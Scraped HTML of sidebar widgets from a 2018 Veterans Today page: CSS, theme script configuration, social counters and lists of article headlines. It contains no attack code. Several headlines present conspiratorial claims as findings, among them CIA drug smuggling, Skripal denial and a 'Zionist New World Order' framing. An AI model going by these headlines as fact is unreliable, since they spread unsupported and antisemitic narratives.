<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/16/trumped-syrian-army-evacuates-12500-civilians-from-eastern-ghouta/" rel="bookmark" title="Trumped:  Syrian Army Evacuates 12,500 Civilians from Eastern Ghouta">Trumped: Syrian Army Evacuates 12,500 Civilians from Eastern Ghouta</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-16T18:34:35+00:00">March 16, 2018</time></span> </div>
</div>
</div>
</div> </div></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_78_5aaf778c39f0f" data-td_block_id="td_uid_78_5aaf778c39f0f"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#" class="td-ajax-next-page" id="next-page-td_uid_78_5aaf778c39f0f" data-td_block_id="td_uid_78_5aaf778c39f0f"><i class="td-icon-font td-icon-menu-right"></i></a></div></div> <div class="td_block_wrap td_block_2 td_uid_82_5aaf778c3e5ca_rand td_with_ajax_pagination td-pb-border-top td_block_template_1 td-column-2 td_block_padding" data-td-block-uid="td_uid_82_5aaf778c3e5ca">
<style>
body .td_uid_82_5aaf778c3e5ca_rand .td_module_wrap:hover .entry-title a,
            body .td_uid_82_5aaf778c3e5ca_rand .td-pulldown-filter-link:hover,
            body .td_uid_82_5aaf778c3e5ca_rand .td-subcat-item a:hover,
            body .td_uid_82_5aaf778c3e5ca_rand .td-subcat-item .td-cur-simple-item,
            body .td_uid_82_5aaf778c3e5ca_rand .td_quote_on_blocks,
            body .td_uid_82_5aaf778c3e5ca_rand .td-opacity-cat .td-post-category:hover,
            body .td_uid_82_5aaf778c3e5ca_rand .td-opacity-read .td-read-more a:hover,
            body .td_uid_82_5aaf778c3e5ca_rand .td-opacity-author .td-post-author-name a:hover,
            body .td_uid_82_5aaf778c3e5ca_rand .td-instagram-user a {
                color: #000000;
            }

            body .td_uid_82_5aaf778c3e5ca_rand .td-next-prev-wrap a:hover,
            body .td_uid_82_5aaf778c3e5ca_rand .td-load-more-wrap a:hover {
                background-color: #000000;
                border-color: #000000;
            }

            body .td_uid_82_5aaf778c3e5ca_rand .block-title > *,
            body .td_uid_82_5aaf778c3e5ca_rand .td-trending-now-title,
            body .td_uid_82_5aaf778c3e5ca_rand .td-read-more a,
            body .td_uid_82_5aaf778c3e5ca_rand .td-weather-information:before,
            body .td_uid_82_5aaf778c3e5ca_rand .td-weather-week:before,
            body .td_uid_82_5aaf778c3e5ca_rand .td-subcat-dropdown:hover .td-subcat-more,
            body .td_uid_82_5aaf778c3e5ca_rand .td-exchange-header:before,
            body .td-footer-wrapper .td_uid_82_5aaf778c3e5ca_rand .td-post-category,
            body .td_uid_82_5aaf778c3e5ca_rand .td-post-category:hover {
                background-color: #000000;
            }
            body .td-footer-wrapper .td_uid_82_5aaf778c3e5ca_rand .block-title > * {
                padding: 6px 7px 5px;
                line-height: 1;
            }

            body .td_uid_82_5aaf778c3e5ca_rand .block-title {
                border-color: #000000;
            }
</style><script>var block_td_uid_82_5aaf778c3e5ca = new tdBlock();
block_td_uid_82_5aaf778c3e5ca.id = "td_uid_82_5aaf778c3e5ca";
block_td_uid_82_5aaf778c3e5ca.atts = '{"limit":"6","sort":"","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"35707","category_ids":"","custom_title":"Investigations","custom_url":"https:\/\/www.veteranstoday.com\/category\/false-flag-investigations\/","show_child_cat":"","sub_cat_ajax":"","ajax_pagination":"next_prev","header_color":"#000000","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":2,"td_ajax_preloading":"","td_ajax_filter_type":"td_popularity_filter_fa","td_ajax_filter_ids":"65,7270,16,15,7271,35707,36,28,42025,70361,70365","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_82_5aaf778c3e5ca_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_82_5aaf778c3e5ca_rand","tdc_css_class_style":"td_uid_82_5aaf778c3e5ca_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_82_5aaf778c3e5ca.td_column_number = "2";
block_td_uid_82_5aaf778c3e5ca.block_type = "td_block_2";
block_td_uid_82_5aaf778c3e5ca.post_count = "6";
block_td_uid_82_5aaf778c3e5ca.found_posts = "2096";
block_td_uid_82_5aaf778c3e5ca.header_color = "#000000";
block_td_uid_82_5aaf778c3e5ca.ajax_pagination_infinite_stop = "";
block_td_uid_82_5aaf778c3e5ca.max_num_pages = "350";
tdBlocksArray.push(block_td_uid_82_5aaf778c3e5ca);
</script><div class="td-block-title-wrap"><h4 class="block-title"><a href="https://www.veteranstoday.com/category/false-flag-investigations/" class="td-pulldown-size">Investigations</a></h4><div class="td-pulldown-syle-default td-subcat-filter" id="td_pulldown_td_uid_82_5aaf778c3e5ca"><ul class="td-subcat-list" id="td_pulldown_td_uid_82_5aaf778c3e5ca_list"><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_83_5aaf778c3f5df" data-td_filter_value="" data-td_block_id="td_uid_82_5aaf778c3e5ca" href="#">All</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_84_5aaf778c3f61b" data-td_filter_value="featured" data-td_block_id="td_uid_82_5aaf778c3e5ca" href="#">Featured</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_85_5aaf778c3f655" data-td_filter_value="popular" data-td_block_id="td_uid_82_5aaf778c3e5ca" href="#">All time popular</a></li></ul><div class="td-subcat-dropdown"><div class="td-subcat-more" aria-haspopup="true"><span>More</span><i class="td-icon-read-down"></i></div><ul class="td-pulldown-filter-list"></ul></div></div></div><div id=td_uid_82_5aaf778c3e5ca class="td_block_inner">
<div class="td-block-row">
<div class="td-block-span6">
<div class="td_module_2 td_module_wrap td-animation-stack">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/never-underestimate-the-cia/" rel="bookmark" title="Never underestimate the CIA"><img width="324" height="160" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/62163-324x160.jpeg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/62163-324x160.jpeg 324w, https://www.veteranstoday.com/wp-content/uploads/2018/03/62163-533x261.jpeg 533w" sizes="(max-width: 324px) 100vw, 324px" alt="" title="Never underestimate the CIA" /></a></div> <a href="https://www.veteranstoday.com/category/false-flag-investigations/" class="td-post-category">Investigations</a> </div>
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/never-underestimate-the-cia/" rel="bookmark" title="Never underestimate the CIA">Never underestimate the CIA</a></h3>
<div class="td-module-meta-info">
 <span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/admin/">VT</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-18T11:02:47+00:00">March 18, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/03/18/never-underestimate-the-cia/#comments">9</a></div> </div>
<div class="td-excerpt">
Many in the USA have come to realize this stealth organization does not work on the behalf of the USA but rather to its own ends.
</div>
</div>
</div> 
<div class="td-block-span6">
<div class="td_module_2 td_module_wrap td-animation-stack">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/pravda-c-i-a-increases-drug-smuggling-in-afghanistan-to-fund-proxies-all-over-the-world/" rel="bookmark" title="Pravda: C.I.A. Increases Drug Smuggling in Afghanistan To Fund Proxies All Over the World"><img width="324" height="160" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/62157-324x160.jpeg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/62157-324x160.jpeg 324w, https://www.veteranstoday.com/wp-content/uploads/2018/03/62157-533x261.jpeg 533w" sizes="(max-width: 324px) 100vw, 324px" alt="" title="Pravda: C.I.A. Increases Drug Smuggling in Afghanistan To Fund Proxies All Over the World" /></a></div> <a href="https://www.veteranstoday.com/category/false-flag-investigations/" class="td-post-category">Investigations</a> </div>
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/pravda-c-i-a-increases-drug-smuggling-in-afghanistan-to-fund-proxies-all-over-the-world/" rel="bookmark" title="Pravda: C.I.A. Increases Drug Smuggling in Afghanistan To Fund Proxies All Over the World">Pravda: C.I.A. Increases Drug Smuggling in Afghanistan To Fund Proxies All...</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/admin/">VT</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-18T10:58:55+00:00">March 18, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/03/18/pravda-c-i-a-increases-drug-smuggling-in-afghanistan-to-fund-proxies-all-over-the-world/#comments">2</a></div> </div>
<div class="td-excerpt">
Civilian casualties are at record levels in Afghanistan: last year, 10,000 civilians were killed in the Central Asian nation, </div>
</div>
</div> </div>
<div class="td-block-row">
<div class="td-block-span6">
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/17/it-wasnt-russia/" rel="bookmark" title="It Wasn&#8217;t Russia!"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/Salisbury-01-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/Salisbury-01-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/03/Salisbury-01-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/Salisbury-01-534x371.jpg 534w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="It Wasn&#8217;t Russia!" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/17/it-wasnt-russia/" rel="bookmark" title="It Wasn&#8217;t Russia!">It Wasn&#8217;t Russia!</a></h3>  <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-17T18:38:25+00:00">March 17, 2018</time></span> </div>
</div>
</div>
</div> 
<div class="td-block-span6">
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/13/sergei-skripal-casualty-of-the-psy-war/" rel="bookmark" title="Sergei Skripal &#8211; Casualty of The Psy War?"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/BorisZionist-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/BorisZionist-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/03/BorisZionist-218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="Sergei Skripal &#8211; Casualty of The Psy War?" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/13/sergei-skripal-casualty-of-the-psy-war/" rel="bookmark" title="Sergei Skripal &#8211; Casualty of The Psy War?">Sergei Skripal &#8211; Casualty of The Psy War?</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-13T17:18:00+00:00">March 13, 2018</time></span> </div>
</div>
</div>
</div> </div>
<div class="td-block-row">
<div class="td-block-span6">
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/12/the-medias-propaganda-war-against-assad/" rel="bookmark" title="The Media&#8217;s Propaganda War Against Assad"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/pnQia-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/pnQia-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/03/pnQia-218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="The Media&#8217;s Propaganda War Against Assad" /><span class="td-video-play-ico td-video-small"><img width="20" height="20" class="td-retina" src="https://www.veteranstoday.com/wp-content/themes/Newspaper/images/icons/video-small.png" alt="video" /></span></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/12/the-medias-propaganda-war-against-assad/" rel="bookmark" title="The Media&#8217;s Propaganda War Against Assad">The Media&#8217;s Propaganda War Against Assad</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-12T20:42:18+00:00">March 12, 2018</time></span> </div>
</div>
</div>
</div> 
<div class="td-block-span6">
<div class="td_module_6 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/10/zio-nwo/" rel="bookmark" title="How Zionist is the New World Order? and How Biblical Is Zionism?"><img width="100" height="70" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/guyenot-yahweh-100x70.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/guyenot-yahweh-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/03/guyenot-yahweh-218x150.jpg 218w" sizes="(max-width: 100px) 100vw, 100px" alt="" title="How Zionist is the New World Order? and How Biblical Is Zionism?" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/10/zio-nwo/" rel="bookmark" title="How Zionist is the New World Order? and How Biblical Is Zionism?">How Zionist is the New World Order? and How Biblical Is...</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-10T18:49:59+00:00">March 10, 2018</time></span> </div>
</div>
</div>
</div> </div></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_82_5aaf778c3e5ca" data-td_block_id="td_uid_82_5aaf778c3e5ca"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#" class="td-ajax-next-page" id="next-page-td_uid_82_5aaf778c3e5ca" data-td_block_id="td_uid_82_5aaf778c3e5ca"><i class="td-icon-font td-icon-menu-right"></i></a></div></div> </div></div></div><div class="wpb_column vc_column_container td-pb-span4"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="td_block_wrap td_block_social_counter td_uid_86_5aaf778c42e92_rand td-social-style4 td-social-colored td-pb-border-top td_block_template_1"><div class="td-block-title-wrap"><h4 class="block-title"><span class="td-pulldown-size">STAY CONNECTED</span></h4></div><div class="td-social-list"><div class="td_social_type td-pb-margin-side td_social_facebook"><div class="td-social-box"><div class="td-sp td-sp-facebook"></div><span class="td_social_info">47,493</span><span class="td_social_info td_social_info_name">Fans</span><span class="td_social_button"><a href="https://www.facebook.com/170917822620">Like</a></span></div></div><div class="td_social_type td-pb-margin-side td_social_googleplus"><div class="td-social-box"><div class="td-sp td-sp-googleplus"></div><span class="td_social_info">378</span><span class="td_social_info td_social_info_name">Followers</span><span class="td_social_button"><a href="https://plus.google.com/+Veteranstodaynetwork">Follow</a></span></div></div><div class="td_social_type td-pb-margin-side td_social_soundcloud"><div class="td-social-box"><div class="td-sp td-sp-soundcloud"></div><span class="td_social_info">114</span><span class="td_social_info td_social_info_name">Followers</span><span class="td_social_button"><a href="https://soundcloud.com/veteranstoday">Follow</a></span></div></div><div class="td_social_type td-pb-margin-side td_social_twitter"><div class="td-social-box"><div class="td-sp td-sp-twitter"></div><span class="td_social_info">36,035</span><span class="td_social_info td_social_info_name">Followers</span><span class="td_social_button"><a href="https://twitter.com/veteranstoday">Follow</a></span></div></div><div class="td_social_type td-pb-margin-side td_social_youtube"><div class="td-social-box"><div class="td-sp td-sp-youtube"></div><span class="td_social_info">804</span><span class="td_social_info td_social_info_name">Subscribers</span><span class="td_social_button"><a href="https://www.youtube.com/channel/UC2Vba5-IAh9kxID8ExsikFw">Subscribe</a></span></div></div></div></div> <div class="td-a-rec td-a-rec-id-custom_ad_4  td_uid_87_5aaf778c431c3_rand td_block_template_1"></p>
<p>
<div id='div-gpt-ad-1516072830995-0'>
<script>
googletag.cmd.push(function() { googletag.display('div-gpt-ad-1516072830995-0'); });
</script>
</div>
<p>
</div><div class="td_block_wrap td_block_15 td_uid_88_5aaf778c43efe_rand td_with_ajax_pagination td-pb-border-top td_block_template_1 td-column-1 td_block_padding" data-td-block-uid="td_uid_88_5aaf778c43efe">
<style>
body .td_uid_88_5aaf778c43efe_rand .td_module_wrap:hover .entry-title a,
            body .td_uid_88_5aaf778c43efe_rand .td-pulldown-filter-link:hover,
            body .td_uid_88_5aaf778c43efe_rand .td-subcat-item a:hover,
            body .td_uid_88_5aaf778c43efe_rand .td-subcat-item .td-cur-simple-item,
            body .td_uid_88_5aaf778c43efe_rand .td_quote_on_blocks,
            body .td_uid_88_5aaf778c43efe_rand .td-opacity-cat .td-post-category:hover,
            body .td_uid_88_5aaf778c43efe_rand .td-opacity-read .td-read-more a:hover,
            body .td_uid_88_5aaf778c43efe_rand .td-opacity-author .td-post-author-name a:hover,
            body .td_uid_88_5aaf778c43efe_rand .td-instagram-user a {
                color: #990000;
            }

            body .td_uid_88_5aaf778c43efe_rand .td-next-prev-wrap a:hover,
            body .td_uid_88_5aaf778c43efe_rand .td-load-more-wrap a:hover {
                background-color: #990000;
                border-color: #990000;
            }

            body .td_uid_88_5aaf778c43efe_rand .block-title > *,
            body .td_uid_88_5aaf778c43efe_rand .td-trending-now-title,
            body .td_uid_88_5aaf778c43efe_rand .td-read-more a,
            body .td_uid_88_5aaf778c43efe_rand .td-weather-information:before,
            body .td_uid_88_5aaf778c43efe_rand .td-weather-week:before,
            body .td_uid_88_5aaf778c43efe_rand .td-subcat-dropdown:hover .td-subcat-more,
            body .td_uid_88_5aaf778c43efe_rand .td-exchange-header:before,
            body .td-footer-wrapper .td_uid_88_5aaf778c43efe_rand .td-post-category,
            body .td_uid_88_5aaf778c43efe_rand .td-post-category:hover {
                background-color: #990000;
            }
            body .td-footer-wrapper .td_uid_88_5aaf778c43efe_rand .block-title > * {
                padding: 6px 7px 5px;
                line-height: 1;
            }

            body .td_uid_88_5aaf778c43efe_rand .block-title {
                border-color: #990000;
            }
</style><script>var block_td_uid_88_5aaf778c43efe = new tdBlock();
block_td_uid_88_5aaf778c43efe.id = "td_uid_88_5aaf778c43efe";
block_td_uid_88_5aaf778c43efe.atts = '{"limit":"4","sort":"","post_ids":"","tag_slug":"","autors_id":"92","installed_post_types":"","category_id":"","category_ids":"","custom_title":"Jim Dean\u0027s Global Vault","custom_url":"https:\/\/www.veteranstoday.com\/author\/dean\/","show_child_cat":"","sub_cat_ajax":"","ajax_pagination":"next_prev","header_color":"#990000","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":1,"td_ajax_preloading":"","td_ajax_filter_type":"td_popularity_filter_fa","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_88_5aaf778c43efe_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_88_5aaf778c43efe_rand","tdc_css_class_style":"td_uid_88_5aaf778c43efe_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_88_5aaf778c43efe.td_column_number = "1";
block_td_uid_88_5aaf778c43efe.block_type = "td_block_15";
block_td_uid_88_5aaf778c43efe.post_count = "4";
block_td_uid_88_5aaf778c43efe.found_posts = "2216";
block_td_uid_88_5aaf778c43efe.header_color = "#990000";
block_td_uid_88_5aaf778c43efe.ajax_pagination_infinite_stop = "";
block_td_uid_88_5aaf778c43efe.max_num_pages = "554";
tdBlocksArray.push(block_td_uid_88_5aaf778c43efe);
</script><div class="td-block-title-wrap"><h4 class="block-title"><a href="https://www.veteranstoday.com/author/dean/" class="td-pulldown-size">Jim Dean&#039;s Global Vault</a></h4><div class="td-pulldown-syle-default td-subcat-filter" id="td_pulldown_td_uid_88_5aaf778c43efe"><ul class="td-subcat-list" id="td_pulldown_td_uid_88_5aaf778c43efe_list"><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_89_5aaf778c449db" data-td_filter_value="" data-td_block_id="td_uid_88_5aaf778c43efe" href="#">All</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_90_5aaf778c44a19" data-td_filter_value="featured" data-td_block_id="td_uid_88_5aaf778c43efe" href="#">Featured</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_91_5aaf778c44a54" data-td_filter_value="popular" data-td_block_id="td_uid_88_5aaf778c43efe" href="#">All time popular</a></li></ul><div class="td-subcat-dropdown"><div class="td-subcat-more" aria-haspopup="true"><span>More</span><i class="td-icon-read-down"></i></div><ul class="td-pulldown-filter-list"></ul></div></div></div><div id=td_uid_88_5aaf778c43efe class="td_block_inner td-column-1"><div class="td-cust-row">
<div class="td-block-span12">
<div class="td_module_mx4 td_module_wrap td-animation-stack">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/17/opcw-no-member-states-known-to-possess-novichok-class-nerve-agents/" rel="bookmark" title="OPCW: No member states known to possess ‘Novichok-class’ nerve agents"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/5aabcfe0dda4c89c348b4571-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/5aabcfe0dda4c89c348b4571-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/5aabcfe0dda4c89c348b4571-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="OPCW: No member states known to possess ‘Novichok-class’ nerve agents" /></a></div> <a href="https://www.veteranstoday.com/category/world-global/" class="td-post-category">World</a> </div>
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/17/opcw-no-member-states-known-to-possess-novichok-class-nerve-agents/" rel="bookmark" title="OPCW: No member states known to possess ‘Novichok-class’ nerve agents">OPCW: No member states known to possess ‘Novichok-class’ nerve agents</a></h3>
</div>
</div> 
<div class="td-block-span12">
<div class="td_module_mx4 td_module_wrap td-animation-stack">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/16/jcpoa-partners-stand-against-trump-on-killing-iran-nuclear-deal/" rel="bookmark" title="JCPOA partners stand against Trump on killing Iran nuclear deal"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/656a6c9d-a702-4233-aa43-dc113b247edf-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/656a6c9d-a702-4233-aa43-dc113b247edf-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/656a6c9d-a702-4233-aa43-dc113b247edf-100x70.jpg 100w, https://www.veteranstoday.com/wp-content/uploads/2018/03/656a6c9d-a702-4233-aa43-dc113b247edf-534x365.jpg 534w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="JCPOA partners stand against Trump on killing Iran nuclear deal" /></a></div> <a href="https://www.veteranstoday.com/category/world-global/" class="td-post-category">World</a> </div>
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/16/jcpoa-partners-stand-against-trump-on-killing-iran-nuclear-deal/" rel="bookmark" title="JCPOA partners stand against Trump on killing Iran nuclear deal">JCPOA partners stand against Trump on killing Iran nuclear deal</a></h3>
</div>
</div> </div><div class="td-cust-row">
<div class="td-block-span12">
<div class="td_module_mx4 td_module_wrap td-animation-stack">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/15/blaming-russia-for-skripal-attack-is-similar-to-jews-poisoning-our-wells-in-middle-ages/" rel="bookmark" title="Blaming Russia for Skripal attack is similar to ‘Jews poisoning our wells’ in Middle Ages"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/Nerve-gas-attack_2-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/Nerve-gas-attack_2-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/Nerve-gas-attack_2-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Blaming Russia for Skripal attack is similar to ‘Jews poisoning our wells’ in Middle Ages" /></a></div> <a href="https://www.veteranstoday.com/category/government-and-politics/" class="td-post-category">Government</a> </div>
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/15/blaming-russia-for-skripal-attack-is-similar-to-jews-poisoning-our-wells-in-middle-ages/" rel="bookmark" title="Blaming Russia for Skripal attack is similar to ‘Jews poisoning our wells’ in Middle Ages">Blaming Russia for Skripal attack is similar to ‘Jews poisoning our...</a></h3>
</div>
</div> 
<div class="td-block-span12">
<div class="td_module_mx4 td_module_wrap td-animation-stack">
<div class="td-module-image">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/15/lavrov-russia-to-expel-uk-diplomats-soon/" rel="bookmark" title="Lavrov &#8211; Russia to expel UK diplomats soon"><img width="218" height="150" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/nerve-agent-attack-218x150.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/nerve-agent-attack-218x150.jpg 218w, https://www.veteranstoday.com/wp-content/uploads/2018/03/nerve-agent-attack-100x70.jpg 100w" sizes="(max-width: 218px) 100vw, 218px" alt="" title="Lavrov &#8211; Russia to expel UK diplomats soon" /></a></div> <a href="https://www.veteranstoday.com/category/world-global/" class="td-post-category">World</a> </div>
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/15/lavrov-russia-to-expel-uk-diplomats-soon/" rel="bookmark" title="Lavrov &#8211; Russia to expel UK diplomats soon">Lavrov &#8211; Russia to expel UK diplomats soon</a></h3>
</div>
</div> </div></div><div class="td-next-prev-wrap"><a href="#" class="td-ajax-prev-page ajax-page-disabled" id="prev-page-td_uid_88_5aaf778c43efe" data-td_block_id="td_uid_88_5aaf778c43efe"><i class="td-icon-font td-icon-menu-left"></i></a><a href="#" class="td-ajax-next-page" id="next-page-td_uid_88_5aaf778c43efe" data-td_block_id="td_uid_88_5aaf778c43efe"><i class="td-icon-font td-icon-menu-right"></i></a></div></div> <div class="clearfix"></div><div class="td_block_wrap td_block_1 td_uid_92_5aaf778c46b94_rand td-pb-border-top td_block_template_1 td-column-1" data-td-block-uid="td_uid_92_5aaf778c46b94">
<style>
body .td_uid_92_5aaf778c46b94_rand .td_module_wrap:hover .entry-title a,
            body .td_uid_92_5aaf778c46b94_rand .td-pulldown-filter-link:hover,
            body .td_uid_92_5aaf778c46b94_rand .td-subcat-item a:hover,
            body .td_uid_92_5aaf778c46b94_rand .td-subcat-item .td-cur-simple-item,
            body .td_uid_92_5aaf778c46b94_rand .td_quote_on_blocks,
            body .td_uid_92_5aaf778c46b94_rand .td-opacity-cat .td-post-category:hover,
            body .td_uid_92_5aaf778c46b94_rand .td-opacity-read .td-read-more a:hover,
            body .td_uid_92_5aaf778c46b94_rand .td-opacity-author .td-post-author-name a:hover,
            body .td_uid_92_5aaf778c46b94_rand .td-instagram-user a {
                color: #990000;
            }

            body .td_uid_92_5aaf778c46b94_rand .td-next-prev-wrap a:hover,
            body .td_uid_92_5aaf778c46b94_rand .td-load-more-wrap a:hover {
                background-color: #990000;
                border-color: #990000;
            }

            body .td_uid_92_5aaf778c46b94_rand .block-title > *,
            body .td_uid_92_5aaf778c46b94_rand .td-trending-now-title,
            body .td_uid_92_5aaf778c46b94_rand .td-read-more a,
            body .td_uid_92_5aaf778c46b94_rand .td-weather-information:before,
            body .td_uid_92_5aaf778c46b94_rand .td-weather-week:before,
            body .td_uid_92_5aaf778c46b94_rand .td-subcat-dropdown:hover .td-subcat-more,
            body .td_uid_92_5aaf778c46b94_rand .td-exchange-header:before,
            body .td-footer-wrapper .td_uid_92_5aaf778c46b94_rand .td-post-category,
            body .td_uid_92_5aaf778c46b94_rand .td-post-category:hover {
                background-color: #990000;
            }
            body .td-footer-wrapper .td_uid_92_5aaf778c46b94_rand .block-title > * {
                padding: 6px 7px 5px;
                line-height: 1;
            }

            body .td_uid_92_5aaf778c46b94_rand .block-title {
                border-color: #990000;
            }
</style><script>var block_td_uid_92_5aaf778c46b94 = new tdBlock();
block_td_uid_92_5aaf778c46b94.id = "td_uid_92_5aaf778c46b94";
block_td_uid_92_5aaf778c46b94.atts = '{"limit":"1","sort":"","post_ids":"","tag_slug":"","autors_id":"192","installed_post_types":"","category_id":"70365","category_ids":"","custom_title":"Kevin Barrett\u0027s Truth Jihad","custom_url":"https:\/\/www.veteranstoday.com\/category\/vt-radio\/truth-jihad\/","show_child_cat":"","sub_cat_ajax":"","ajax_pagination":"","header_color":"#990000","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":1,"td_ajax_preloading":"","td_ajax_filter_type":"","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_92_5aaf778c46b94_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_92_5aaf778c46b94_rand","tdc_css_class_style":"td_uid_92_5aaf778c46b94_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_92_5aaf778c46b94.td_column_number = "1";
block_td_uid_92_5aaf778c46b94.block_type = "td_block_1";
block_td_uid_92_5aaf778c46b94.post_count = "1";
block_td_uid_92_5aaf778c46b94.found_posts = "124";
block_td_uid_92_5aaf778c46b94.header_color = "#990000";
block_td_uid_92_5aaf778c46b94.ajax_pagination_infinite_stop = "";
block_td_uid_92_5aaf778c46b94.max_num_pages = "124";
tdBlocksArray.push(block_td_uid_92_5aaf778c46b94);
